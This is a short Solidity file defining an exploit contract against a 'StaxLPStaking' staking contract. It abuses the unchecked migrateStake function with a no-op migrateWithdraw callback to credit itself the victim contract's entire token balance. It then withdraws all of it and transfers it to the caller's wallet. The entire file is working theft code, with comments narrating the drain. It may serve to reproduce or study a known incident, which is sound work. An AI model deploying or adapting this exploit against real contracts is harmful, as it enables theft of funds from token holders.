// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IStaxLPStaking {
  function migrateStake(address oldStaking, uint256 amount) external;

  function withdrawAll(bool claim) external;
}

contract StaxLPStakingExploit {
  IStaxLPStaking private immutable stakingContract;
  IERC20 private immutable token;

  constructor(address _stakingContract, address _token) {
    stakingContract = IStaxLPStaking(_stakingContract);
    token = IERC20(_token);
  }

  function exploit() public {
    // Use the vulnerability to stake the entire balance of the StaxLPStaking
    // contract
    uint256 stakingContractBalance = token.balanceOf(address(stakingContract));
    stakingContract.migrateStake(address(this), stakingContractBalance);

    // Now just withdraw the tokens
    stakingContract.withdrawAll(false);

    // Now transfer them to our EOA
    token.transfer(msg.sender, stakingContractBalance);
  }

  // Our `migrateWithdraw()` function does nothing
  function migrateWithdraw(address, uint256) external {}
}
